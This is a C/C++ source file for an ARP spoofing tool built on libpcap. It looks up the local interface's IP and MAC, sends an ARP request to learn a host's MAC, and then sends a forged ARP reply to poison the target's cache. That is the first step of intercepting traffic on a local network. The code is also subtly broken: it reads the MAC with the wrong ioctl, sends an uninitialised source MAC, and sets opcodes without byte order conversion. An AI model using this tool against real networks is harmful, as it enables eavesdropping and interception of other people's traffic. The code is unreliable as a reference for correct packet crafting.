#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>           // close()
#include <string.h>           // strcpy, memset()
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/ip.h>       // IP_MAXPACKET (65535)
#include <netinet/ether.h>
#include <sys/types.h>        // needed for socket(), uint8_t, uint16_t
#include <sys/socket.h>       // needed for socket()
#include <linux/if_ether.h>   // ETH_P_ARP = 0x0806, ETH_P_ALL = 0x0003
#include <net/ethernet.h>
#include <pcap.h>
#include <errno.h>     

struct arp_hdr {
	uint16_t htype = ntohs(0x0001);
	uint16_t ptype = ntohs(0x0800);
	uint8_t hlen = 6;
	uint8_t plen = 4;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};

struct ether_hdr {
	uint8_t dest_mac[6];
	uint8_t src_mac[6];
	uint16_t type = ntohs(0x0806);
	struct arp_hdr arp;
};


void get_my_ip(uint8_t * my_ip, char * interface) {
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	}
	else {
		//inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));
		memcpy(my_ip, ifr.ifr_addr.sa_data + 2, 4);
	}
}

void get_my_mac(uint8_t * my_mac, char * interface) {
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	}
	else {
		//		inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));
		memcpy(my_mac, ifr.ifr_addr.sa_data, 6);
	}
}

void arp_request(uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* my_mac, uint8_t* my_ip, uint8_t* target_mac, pcap_t* handle){
	struct ether_hdr eth;
	uint8_t size = sizeof(struct ether_hdr);
	uint8_t* header = (uint8_t *)malloc(size);
	memset(eth.dest_mac, 0xff, 6);
	memcpy(eth.src_mac, sender_mac, 6);
	eth.arp.opcode = (uint16_t)(0x0001);
	memcpy(eth.arp.sender_mac, my_mac, 6);
	memcpy(eth.arp.sender_ip, my_ip, 4);
	memset(eth.arp.target_mac, 0x00, 6);
	memcpy(eth.arp.target_ip, sender_ip, 4);

	memcpy(header, &eth, size);
	pcap_sendpacket(handle, header, size);
	while (1) {
		struct pcap_pkthdr* header1;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header1, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		if(ntohs(*((uint16_t*)(packet + 12)))==0x0806){
			memcpy(target_mac, packet + 22, 6);
			break;
		}
		printf("1\n");
	}
}

void arp_spoof(uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* my_mac, uint8_t* my_ip, uint8_t* target_mac, uint8_t* target_ip, pcap_t* handle) {
	struct ether_hdr eth;
	uint8_t size = sizeof(struct ether_hdr);
	uint8_t* header = (uint8_t *)malloc(size);
	memcpy(eth.dest_mac, target_mac, 6);
	memcpy(eth.src_mac, my_mac, 6);
	eth.arp.opcode = (uint16_t)(0x0002);
	memcpy(eth.arp.sender_mac, my_mac, 6);
	memcpy(eth.arp.sender_ip, sender_ip, 4);
	memcpy(eth.arp.target_mac, target_mac, 6);
	memcpy(eth.arp.target_ip, target_ip, 4);

	memcpy(header, &eth, size);
	pcap_sendpacket(handle, header, size);
}



int main(int argc, char* argv[])
{
	if (argc != 4) {
		printf("error");
		return -1;
	}

	char * interface = argv[1];
	uint8_t my_ip[4];
	uint8_t my_mac[6];
	uint8_t sender_ip[4];
	uint8_t sender_mac[6];
	uint8_t target_ip[4];
	uint8_t target_mac[6];
	uint32_t tmp = inet_addr(argv[2]);
	memcpy(sender_ip, &tmp, 4);
	uint32_t tmp2 = inet_addr(argv[3]);
	memcpy(target_ip, &tmp2, 4);
	
	char errbuf[PCAP_ERRBUF_SIZE];
	get_my_ip(my_ip, interface);
	get_my_mac(my_mac, interface);

	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	arp_request(sender_mac, sender_ip, my_mac, my_ip, target_mac, handle);
	arp_spoof(sender_mac, sender_ip, my_mac, my_ip, target_mac, target_ip, handle);
	pcap_close(handle);
	return 0;
}


